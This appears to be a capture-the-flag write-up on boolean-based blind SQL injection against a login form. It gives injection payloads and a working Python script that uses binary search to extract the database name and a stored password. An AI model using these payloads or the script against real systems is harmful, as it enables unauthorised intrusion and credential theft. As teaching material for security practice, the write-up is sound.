01 — What Makes It "Blind"?

In a classic (error-based or UNION-based) SQL injection, the database's response is reflected directly in the page — you inject UNION SELECT user,password FROM users-- and the credentials appear on screen.

In blind SQLi, nothing is reflected. The page gives you a binary signal: either it shows content (TRUE) or it doesn't (FALSE). You have to extract data one bit at a time by asking yes/no questions through carefully crafted queries.

02 — Confirming the Injection Point

The challenge presents a login form. The target URL is /login with username and password POST parameters.

# Test 1 — always-true username: admin' AND '1'='1 password: anything → Response: "Welcome back, admin!" (TRUE) # Test 2 — always-false username: admin' AND '1'='2 password: anything → Response: "Invalid credentials" (FALSE)
// confirmed

We get different responses based on the truth value of our injected condition — textbook boolean-based blind injection.

03 — Boolean-Based Extraction Logic

# Is the first character of the database name ASCII 105 ('i')? username: admin' AND ASCII(SUBSTRING(database(),1,1))=105-- - # Generic form: AND ASCII(SUBSTRING([target],position,1)) [operator] [value]

# Length of database name admin' AND LENGTH(database())=7-- - → TRUE # Binary search per character → "intradb"

08 — Scripting It in Python

After confirming the technique manually, automate extraction:

import requests, string TARGET = "http://ctf.target/login" def is_true(payload: str) -> bool: r = requests.post(TARGET, data={ "username": f"admin' AND {payload}-- -", "password": "x" }) return "Welcome" in r.text def extract_string(query: str, max_len=50) -> str: result = "" for pos in range(1, max_len + 1): lo, hi = 32, 126 while lo < hi: mid = (lo + hi) // 2 if is_true(f"ASCII(SUBSTRING(({query}),{pos},1))>{mid}"): lo = mid + 1 else: hi = mid if lo == 32: break result += chr(lo) return result db_name = extract_string("SELECT database()") password = extract_string("SELECT password FROM users LIMIT 0,1")

09 — Why Bother Without SQLmap?

Fair question. SQLmap exists and it's excellent. Here's why I still do this manually first on CTF challenges:

  • Filter bypasses — when a WAF blocks SQLmap's payloads, you need to craft custom ones. You can't customize what you don't understand.
  • Custom injection points — SQLmap struggles with non-standard injection contexts (JSON bodies, custom headers, GraphQL). Manual first, then automate.
  • Interviews & certs — OSCP prohibits automated tools for point-scoring. Understanding the mechanics is the exam.
  • Debugging — when SQLmap fails silently, you need the manual technique to diagnose why.
  • Speed on narrow targets — a single-table extraction with a purpose-built script runs in seconds with zero fingerprinting overhead.
